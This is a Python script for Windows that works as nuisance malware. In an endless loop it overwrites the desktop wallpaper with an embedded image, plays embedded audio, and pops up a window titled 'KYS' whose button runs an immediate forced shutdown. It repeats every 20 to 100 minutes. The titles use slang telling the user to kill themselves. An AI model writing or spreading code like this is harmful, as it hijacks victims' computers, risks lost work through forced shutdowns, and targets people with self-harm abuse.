from tkinter import Tk, Label, Button
from PIL import Image, ImageTk
import base64
import io
import random
import os
import time
import threading
import pygame
import ctypes
import getpass

img_data = b''

def main():
    root = Tk()
    root.title('KYS')
    root.geometry(f'400x400+{random.randint(0,1000)}+{random.randint(0,400)}')
    root.resizable(0, 0)

    # Загружаем изображение
    img = Image.open(io.BytesIO(base64.b64decode(img_data)))
    img = img.resize((400, 300))  # Изменяем размер изображения, если необходимо
    img_tk = ImageTk.PhotoImage(img)

    def kys():
        os.system('shutdown -s -t 0')

    # Создаем метку с изображением
    lb = Label(root, image=img_tk)
    lb.pack()
    bt = Button(root,text='KMS',command=kys,bg = 'red', fg='white', width=400, height=100,font=80)
    bt.pack()

    root.mainloop()


mp3 = b''
pygame.mixer.init()
pygame.mixer.music.load(io.BytesIO(base64.b64decode(mp3)))


def set_wallpaper():
    try:
        img = Image.open(f'C:/Users/{getpass.getuser()}/kys.jpg')
    except:
        img = Image.open(io.BytesIO(base64.b64decode(img_data)))
        img.save(f'C:/Users/{getpass.getuser()}/kys.jpg')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'C:/Users/{getpass.getuser()}/kys.jpg', 3)



while True:
    set_wallpaper()
    pygame.mixer.music.play()
    th = threading.Thread(main()).start()
    time.sleep(random.randint(20,100)*60)